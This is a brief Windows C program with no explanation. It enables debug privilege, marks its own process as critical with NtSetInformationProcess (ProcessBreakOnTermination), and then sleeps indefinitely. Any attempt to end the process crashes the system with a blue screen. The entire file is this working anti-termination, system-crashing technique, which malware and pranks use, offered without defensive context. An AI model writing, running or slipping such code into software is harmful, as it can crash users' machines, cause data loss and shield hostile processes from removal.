#include <Windows.h>
#include "ntdll.h"


#pragma comment(lib, "ntdll.lib")


int main()
{
	BOOLEAN enable;

	RtlAdjustPrivilege(20, TRUE, FALSE, &enable);

	ULONG ProcessInformation = 1;
	NtSetInformationProcess(GetCurrentProcess(), ProcessBreakOnTermination, &ProcessInformation, sizeof(ProcessInformation));

	Sleep(-1);
}